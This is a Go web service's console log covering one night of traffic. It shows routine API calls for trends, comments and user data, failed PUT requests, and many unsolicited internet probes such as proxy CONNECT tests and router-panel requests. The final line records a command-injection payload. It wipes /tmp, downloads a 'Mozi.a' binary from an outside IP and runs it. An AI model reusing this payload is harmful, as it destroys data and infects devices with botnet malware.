go build -o service_auth cmd/main.go
./service_auth --port="8080"
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.308779ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.244049ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.281799ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.429217ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.433721ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.333531ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.287427ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.372776ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.444258ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.558468ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.199017ms
2024/11/08 00:56:41 Watched: 60
2024/11/08 00:56:41 Trends gotten
2024/11/08 00:56:41 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.381752ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.22448ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.404431ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.29455ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.340777ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.220245ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.139988ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.111123ms
2024/11/08 00:56:42 Watched: 60
2024/11/08 00:56:42 Trends gotten
2024/11/08 00:56:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:41926 - 200 5B in 2.238893ms
2024/11/08 01:00:34 "CONNECT http://45.61.137.126:722745.61.137.126:7227 HTTP/1.1" from 178.215.236.52:18882 - 404 19B in 99.08µs
2024/11/08 01:29:12 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale HTTP/1.1" from 185.224.128.83:41456 - 404 19B in 9.595µs
2024/11/08 01:32:05 "GET http://45.156.21.196:8080/ HTTP/1.1" from 185.140.160.119:4243 - 404 19B in 10.437µs
2024/11/08 01:36:01 Watched: 0
2024/11/08 01:36:01 Trends gotten
2024/11/08 01:36:01 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:35310 - 200 20382B in 71.80237ms
2024/11/08 02:02:24 "GET http://45.156.21.196:8080/robots.txt HTTP/1.1" from 45.156.21.196:47306 - 404 19B in 10.89µs
2024/11/08 02:02:24 Watched: 0
2024/11/08 02:02:24 Trends gotten
2024/11/08 02:02:24 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:47306 - 200 20382B in 65.682145ms
2024/11/08 02:35:22 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 154.213.184.18:44372 - 404 19B in 10.453µs
2024/11/08 02:37:39 "GET http://example.comhttp://example.com/ HTTP/1.1" from 178.215.238.112:38978 - 404 19B in 10.766µs
2024/11/08 02:37:39 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 178.215.238.112:38992 - 404 19B in 9.728µs
2024/11/08 02:37:39 "GET http://example.comhttp://example.com/ HTTP/1.1" from 178.215.238.112:39004 - 404 19B in 9.791µs
2024/11/08 02:37:39 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 178.215.238.112:39010 - 404 19B in 11.836µs
2024/11/08 02:44:50 "GET http://127.0.0.1/ HTTP/1.0" from 175.140.104.198:37663 - 404 19B in 10.793µs
2024/11/08 03:30:44 "CONNECT http://185.65.245.140:7227185.65.245.140:7227 HTTP/1.1" from 154.216.20.210:45262 - 404 19B in 9.289µs
2024/11/08 03:48:32 "GET http://127.0.0.1/ HTTP/1.0" from 111.246.170.30:44971 - 404 19B in 10.543µs
2024/11/08 04:01:01 "GET http://45.156.21.196:8080/ HTTP/1.1" from 64.62.197.199:28411 - 404 19B in 10.055µs
2024/11/08 04:01:31 "GET http://45.156.21.196:8080/favicon.ico HTTP/1.1" from 64.62.197.197:7535 - 404 19B in 32.37µs
2024/11/08 04:01:48 "GET http://api.ipify.orghttp://api.ipify.org/?format=json HTTP/1.1" from 64.62.197.205:15251 - 404 19B in 9.835µs
2024/11/08 04:02:00 "CONNECT http://www.shadowserver.org:443www.shadowserver.org:443 HTTP/1.1" from 64.62.197.207:29159 - 404 19B in 9.506µs
2024/11/08 04:06:30 "GET http://example.comhttp://example.com/ HTTP/1.1" from 95.214.27.169:34090 - 404 19B in 3.402µs
2024/11/08 04:06:30 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 95.214.27.169:34100 - 404 19B in 9.085µs
2024/11/08 04:06:30 "GET http://example.comhttp://example.com/ HTTP/1.1" from 95.214.27.169:34112 - 404 19B in 9.868µs
2024/11/08 04:06:31 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 95.214.27.169:34120 - 404 19B in 10.104µs
2024/11/08 04:47:48 "GET http://45.156.21.196:8080/robots.txt HTTP/1.1" from 45.156.21.196:54410 - 404 19B in 11.15µs
2024/11/08 04:47:49 Trends gotten
2024/11/08 04:47:49 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:54410 - 200 20381B in 74.696732ms
2024/11/08 04:48:01 Trends gotten
2024/11/08 04:48:01 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:54410 - 200 20371B in 67.222414ms
2024/11/08 04:48:02 Trends gotten
2024/11/08 04:48:02 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:54410 - 200 20384B in 60.452175ms
2024/11/08 04:50:37 "CONNECT http://google.com:443google.com:443 HTTP/1.1" from 185.91.127.94:38306 - 404 19B in 35.234µs
2024/11/08 05:17:26 "GET http://127.0.0.1/ HTTP/1.0" from 125.229.114.226:33963 - 404 19B in 11.703µs
2024/11/08 05:52:08 "CONNECT http://45.61.136.175:722745.61.136.175:7227 HTTP/1.1" from 154.213.187.55:39226 - 404 19B in 9.299µs
2024/11/08 06:09:00 Watched: 0
2024/11/08 06:09:00 Trends gotten
2024/11/08 06:09:00 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:45828 - 200 20383B in 64.939206ms
2024/11/08 06:09:13 "GET http://45.156.21.196:8080/api/get/comments/214 HTTP/1.1" from 45.156.21.196:45828 - 200 4B in 1.935757ms
2024/11/08 06:09:17 Watched: 20
2024/11/08 06:09:17 Trends gotten
2024/11/08 06:09:17 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:45828 - 200 23223B in 64.800791ms
2024/11/08 06:09:22 "GET http://45.156.21.196:8080/api/get/comments/198 HTTP/1.1" from 45.156.21.196:35014 - 200 403B in 1.61883ms
2024/11/08 06:17:37 "GET http://45.156.21.196:8080/ HTTP/1.1" from 147.185.132.40:63134 - 404 19B in 10.507µs
2024/11/08 06:37:28 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 154.213.184.18:53542 - 404 19B in 15.135µs
2024/11/08 06:38:31 "GET http://example.comhttp://example.com/ HTTP/1.1" from 95.214.27.169:55418 - 404 19B in 9.745µs
2024/11/08 06:38:31 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 95.214.27.169:55434 - 404 19B in 10.147µs
2024/11/08 06:38:31 "GET http://example.comhttp://example.com/ HTTP/1.1" from 95.214.27.169:55438 - 404 19B in 11.123µs
2024/11/08 06:38:31 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 95.214.27.169:55444 - 404 19B in 9.202µs
2024/11/08 06:50:35 "GET http:/// HTTP/1.0" from 78.108.177.52:37974 - 404 19B in 12.393µs
2024/11/08 06:56:06 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale HTTP/1.1" from 185.224.128.83:34088 - 404 19B in 16.02µs
2024/11/08 07:15:56 "GET http://45.156.21.196:8080/ HTTP/1.1" from 45.156.21.196:51508 - 404 19B in 9.425µs
2024/11/08 07:36:30 "CONNECT http://45.61.136.175:722745.61.136.175:7227 HTTP/1.1" from 194.48.251.26:32530 - 404 19B in 9.547µs
2024/11/08 07:53:44 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale HTTP/1.1" from 185.16.38.232:38558 - 404 19B in 10.392µs
2024/11/08 08:01:40 "GET http://45.156.21.196:8080/ HTTP/1.1" from 206.168.34.223:58708 - 404 19B in 11.1µs
2024/11/08 08:01:40 "PRI http://* HTTP/2.0" from 206.168.34.223:58720 - 405 0B in 7.476µs
2024/11/08 08:01:45 "GET http://45.156.21.196:8080/ HTTP/1.1" from 162.142.125.216:60828 - 404 19B in 9.637µs
2024/11/08 08:01:45 "PRI http://* HTTP/2.0" from 162.142.125.216:60842 - 405 0B in 7.006µs
2024/11/08 08:01:48 "GET http://45.156.21.196:8080/metrics HTTP/1.1" from 206.168.34.223:58764 - 404 19B in 9.948µs
2024/11/08 08:01:50 "GET http://45.156.21.196:8080/ HTTP/1.1" from 162.142.125.198:54196 - 404 19B in 10.151µs
2024/11/08 08:01:51 "PRI http://* HTTP/2.0" from 162.142.125.198:54202 - 405 0B in 7.095µs
2024/11/08 08:01:51 "GET http://45.156.21.196:8080/ HTTP/1.1" from 167.94.138.114:56824 - 404 19B in 10.405µs
2024/11/08 08:01:52 "PRI http://* HTTP/2.0" from 167.94.138.114:56834 - 405 0B in 7.462µs
2024/11/08 08:01:53 "GET http://45.156.21.196:8080/metrics HTTP/1.1" from 162.142.125.216:55684 - 404 19B in 16.958µs
2024/11/08 08:01:57 "GET http://45.156.21.196:8080/ HTTP/1.1" from 167.94.138.113:54036 - 404 19B in 25.261µs
2024/11/08 08:01:58 "GET http://45.156.21.196:8080/ HTTP/1.1" from 167.94.138.53:40420 - 404 19B in 13.09µs
2024/11/08 08:01:58 "PRI http://* HTTP/2.0" from 167.94.138.113:54042 - 405 0B in 9.803µs
2024/11/08 08:01:59 "GET http://45.156.21.196:8080/metrics HTTP/1.1" from 162.142.125.198:52692 - 404 19B in 9.287µs
2024/11/08 08:02:00 "PRI http://* HTTP/2.0" from 167.94.138.53:40430 - 405 0B in 9.959µs
2024/11/08 08:02:03 "GET http://45.156.21.196:8080/ HTTP/1.1" from 167.94.138.122:36720 - 404 19B in 10µs
2024/11/08 08:02:04 "PRI http://* HTTP/2.0" from 167.94.138.122:36728 - 405 0B in 7.594µs
2024/11/08 08:02:06 "GET http://45.156.21.196:8080/metrics HTTP/1.1" from 167.94.138.114:43826 - 404 19B in 9.83µs
2024/11/08 08:02:09 "GET http://45.156.21.196:8080/metrics HTTP/1.1" from 167.94.138.113:53594 - 404 19B in 9.945µs
2024/11/08 08:02:23 "GET http://45.156.21.196:8080/metrics HTTP/1.1" from 167.94.138.53:35602 - 404 19B in 10.253µs
2024/11/08 08:13:44 "GET http://45.156.21.196:8080/ HTTP/1.1" from 45.156.21.196:51986 - 404 19B in 31.238µs
2024/11/08 08:25:26 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale HTTP/1.1" from 5.181.190.29:54908 - 404 19B in 9.434µs
2024/11/08 08:40:59 "GET http://127.0.0.1/ HTTP/1.0" from 114.34.196.89:46729 - 404 19B in 11.389µs
2024/11/08 08:43:32 "GET http://45.156.21.196:8080/ HTTP/1.1" from 45.84.89.3:59960 - 404 19B in 13.974µs
2024/11/08 08:44:12 Watched: 0
2024/11/08 08:44:12 Trends gotten
2024/11/08 08:44:12 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:55102 - 200 20371B in 60.924079ms
2024/11/08 08:57:05 "GET http://45.156.21.196:8080/ HTTP/1.1" from 168.181.15.15:62217 - 404 19B in 16.031µs
2024/11/08 09:05:46 "GET http://45.156.21.196:8080/ HTTP/1.1" from 185.191.126.248:52918 - 404 19B in 19.495µs
2024/11/08 09:12:48 Watched: 0
2024/11/08 09:12:48 Trends gotten
2024/11/08 09:12:48 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:56372 - 200 20371B in 66.441675ms
2024/11/08 09:12:52 Watched: 0
2024/11/08 09:12:52 Trends gotten
2024/11/08 09:12:52 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:48288 - 200 20384B in 73.871043ms
2024/11/08 09:13:10 http://45.156.21.196:8530/api_auth_aether_server_sso/login
2024/11/08 09:13:10 "POST http://45.156.21.196:8080/login HTTP/1.1" from 45.156.21.196:56372 - 200 0B in 2.32569ms
2024/11/08 09:13:10 Watched: 0
2024/11/08 09:13:10 Trends gotten
2024/11/08 09:13:10 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:56372 - 200 20382B in 76.317294ms
2024/11/08 09:13:13 "GET http://45.156.21.196:8080/api/get/comments/214 HTTP/1.1" from 45.156.21.196:48288 - 200 4B in 1.433953ms
2024/11/08 09:13:32 Watched: 20
2024/11/08 09:13:32 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/136/136
2024/11/08 09:13:32 "GET http://45.156.21.196:8080/api/get/user/136 HTTP/1.1" from 45.156.21.196:48288 - 200 959B in 2.549088ms
2024/11/08 09:13:32 Z1
2024/11/08 09:13:32 "GET http://45.156.21.196:8080/api/get/posts_of/136/100 HTTP/1.1" from 45.156.21.196:48288 - 200 1038B in 3.427347ms
2024/11/08 09:13:39 "GET http://45.156.21.196:8080/api/get/comments/193 HTTP/1.1" from 45.156.21.196:56372 - 200 4B in 1.453982ms
2024/11/08 09:13:42 Watched: 0
2024/11/08 09:13:42 Trends gotten
2024/11/08 09:13:42 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:48288 - 200 20371B in 61.836469ms
2024/11/08 09:13:44 Watched: 20
2024/11/08 09:13:44 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/136/136
2024/11/08 09:13:44 "GET http://45.156.21.196:8080/api/get/user/136 HTTP/1.1" from 45.156.21.196:48288 - 200 959B in 2.175877ms
2024/11/08 09:13:44 Z1
2024/11/08 09:13:44 "GET http://45.156.21.196:8080/api/get/posts_of/136/100 HTTP/1.1" from 45.156.21.196:48288 - 200 1038B in 3.53989ms
2024/11/08 09:13:52 Watched: 0
2024/11/08 09:13:52 Trends gotten
2024/11/08 09:13:52 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:48288 - 200 20388B in 73.397263ms
2024/11/08 09:13:53 Watched: 20
2024/11/08 09:13:53 http://45.156.21.196:8003/database_zov_russ_cbo/users/get/136/136
2024/11/08 09:13:53 "GET http://45.156.21.196:8080/api/get/user/136 HTTP/1.1" from 45.156.21.196:48288 - 200 959B in 2.276657ms
2024/11/08 09:13:54 Z1
2024/11/08 09:13:54 "GET http://45.156.21.196:8080/api/get/posts_of/136/100 HTTP/1.1" from 45.156.21.196:48288 - 200 1038B in 3.42757ms
2024/11/08 09:14:08 ZZZZ
2024/11/08 09:14:08 userID: 136
2024/11/08 09:14:08 privileges: 0
2024/11/08 09:14:14 ZZZZ
2024/11/08 09:14:14 userID: 136
2024/11/08 09:14:14 privileges: 0
2024/11/08 09:14:15 ZZZZ
2024/11/08 09:14:15 userID: 136
2024/11/08 09:14:15 privileges: 0
2024/11/08 09:14:20 ZZZZ
2024/11/08 09:14:20 userID: 136
2024/11/08 09:14:20 privileges: 0
2024/11/08 09:14:22 ZZZZ
2024/11/08 09:14:22 userID: 136
2024/11/08 09:14:22 privileges: 0
2024/11/08 09:16:08 read tcp 45.156.21.196:8080->45.156.21.196:56372: i/o timeout
2024/11/08 09:16:08 "PUT http://45.156.21.196:8080/api/put/changeuser HTTP/1.1" from 45.156.21.196:56372 - 400 86B in 2m0.014931901s
2024/11/08 09:16:14 read tcp 45.156.21.196:8080->45.156.21.196:48288: i/o timeout
2024/11/08 09:16:14 "PUT http://45.156.21.196:8080/api/put/changeuser HTTP/1.1" from 45.156.21.196:48288 - 400 86B in 2m0.005048716s
2024/11/08 09:16:15 read tcp 45.156.21.196:8080->45.156.21.196:34710: i/o timeout
2024/11/08 09:16:15 "PUT http://45.156.21.196:8080/api/put/changeuser HTTP/1.1" from 45.156.21.196:34710 - 400 86B in 2m0.000568868s
2024/11/08 09:16:20 read tcp 45.156.21.196:8080->45.156.21.196:34722: i/o timeout
2024/11/08 09:16:20 "PUT http://45.156.21.196:8080/api/put/changeuser HTTP/1.1" from 45.156.21.196:34722 - 400 86B in 2m0.002544014s
2024/11/08 09:16:21 unexpected EOF
2024/11/08 09:16:21 "PUT http://45.156.21.196:8080/api/put/changeuser HTTP/1.1" from 45.156.21.196:33588 - 400 37B in 1m58.429477726s
2024/11/08 09:19:48 "GET http://hackaton-ogetto.space/ HTTP/1.1" from 205.210.31.225:59320 - 404 19B in 10.191µs
2024/11/08 09:23:26 Watched: 0
2024/11/08 09:23:26 Trends gotten
2024/11/08 09:23:26 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:52634 - 200 20388B in 74.319176ms
2024/11/08 09:23:33 "GET http://45.156.21.196:8080/api/get/comments/214 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.402428ms
2024/11/08 09:23:42 "GET http://45.156.21.196:8080/api/get/comments/216 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.655377ms
2024/11/08 09:23:50 "GET http://45.156.21.196:8080/api/get/comments/218 HTTP/1.1" from 45.156.21.196:52634 - 200 4B in 1.855269ms
2024/11/08 09:23:54 Watched: 0
2024/11/08 09:23:54 Trends gotten
2024/11/08 09:23:54 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:56996 - 200 20378B in 68.029369ms
2024/11/08 09:23:57 "GET http://45.156.21.196:8080/api/get/comments/210 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.425299ms
2024/11/08 09:24:02 "GET http://45.156.21.196:8080/api/get/comments/212 HTTP/1.1" from 45.156.21.196:52634 - 200 4B in 1.82314ms
2024/11/08 09:24:13 "GET http://45.156.21.196:8080/api/get/comments/207 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.639888ms
2024/11/08 09:24:16 Watched: 20
2024/11/08 09:24:16 Trends gotten
2024/11/08 09:24:16 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:52634 - 200 23210B in 74.874244ms
2024/11/08 09:24:17 "GET http://45.156.21.196:8080/api/get/comments/199 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.356503ms
2024/11/08 09:24:22 "GET http://45.156.21.196:8080/api/get/comments/198 HTTP/1.1" from 45.156.21.196:56996 - 200 403B in 1.587703ms
2024/11/08 09:24:26 "GET http://45.156.21.196:8080/api/get/comments/197 HTTP/1.1" from 45.156.21.196:56996 - 200 183B in 1.584441ms
2024/11/08 09:24:28 "GET http://45.156.21.196:8080/api/get/comments/196 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.463632ms
2024/11/08 09:24:29 "GET http://45.156.21.196:8080/api/get/comments/196 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.424373ms
2024/11/08 09:24:33 "GET http://45.156.21.196:8080/api/get/comments/195 HTTP/1.1" from 45.156.21.196:56996 - 200 4B in 1.434663ms
2024/11/08 09:38:51 "GET http://example.comhttp://example.com/ HTTP/1.1" from 178.215.238.112:43716 - 404 19B in 10.803µs
2024/11/08 09:38:51 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 178.215.238.112:43718 - 404 19B in 10.137µs
2024/11/08 09:38:51 "GET http://example.comhttp://example.com/ HTTP/1.1" from 178.215.238.112:43732 - 404 19B in 11.01µs
2024/11/08 09:38:51 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 178.215.238.112:43746 - 404 19B in 9.974µs
2024/11/08 10:07:26 "GET http://45.156.21.196:8080/ HTTP/1.1" from 13.64.193.76:46130 - 404 19B in 18.001µs
2024/11/08 10:17:21 "GET http://45.156.21.196:8080/ HTTP/1.1" from 202.88.234.44:60851 - 404 19B in 9.15µs
2024/11/08 10:19:23 Watched: 0
2024/11/08 10:19:23 Trends gotten
2024/11/08 10:19:23 "GET http://45.156.21.196:8080/api/get/trends/20 HTTP/1.1" from 45.156.21.196:56354 - 200 20394B in 67.389575ms
2024/11/08 10:38:46 "GET http://127.0.0.1/ HTTP/1.0" from 222.228.154.114:50216 - 404 19B in 10.571µs
2024/11/08 10:38:47 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 154.213.184.18:44944 - 404 19B in 9.63µs
2024/11/08 10:38:47 "GET http://127.0.0.1/ HTTP/1.0" from 222.228.154.114:50266 - 404 19B in 10.125µs
2024/11/08 10:40:41 "GET http://127.0.0.1/ HTTP/1.0" from 121.122.109.159:55310 - 404 19B in 26.82µs
2024/11/08 10:48:21 "GET http://127.0.0.1/ HTTP/1.0" from 95.234.112.60:43446 - 404 19B in 12.29µs
2024/11/08 11:12:15 "CONNECT http://ipv4.google.com:443ipv4.google.com:443 HTTP/1.1" from 80.75.212.9:39444 - 404 19B in 9.564µs
2024/11/08 11:15:42 "GET http://example.comhttp://example.com/ HTTP/1.1" from 95.214.27.169:58432 - 404 19B in 32.303µs
2024/11/08 11:15:42 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 95.214.27.169:58440 - 404 19B in 47.539µs
2024/11/08 11:15:42 "GET http://example.comhttp://example.com/ HTTP/1.1" from 95.214.27.169:58456 - 404 19B in 11.04µs
2024/11/08 11:15:42 "CONNECT http://example.com:443example.com:443 HTTP/1.1" from 95.214.27.169:58464 - 404 19B in 5.349µs
2024/11/08 11:23:48 "GET http://45.156.21.196:8080/cgi-bin/luci/;stok=/locale HTTP/1.1" from 185.224.128.83:52032 - 404 19B in 11.207µs
2024/11/08 11:27:03 "GET http://127.0.0.1/ HTTP/1.0" from 125.229.70.71:35119 - 404 19B in 16.117µs
2024/11/08 11:32:46 "GET http:/// HTTP/1.0" from 147.185.132.61:49423 - 404 19B in 11.19µs
2024/11/08 11:38:12 "GET http:///board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://59.95.90.106:52781/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" from 59.95.90.106:60914 - 404 19B in 69.017µs
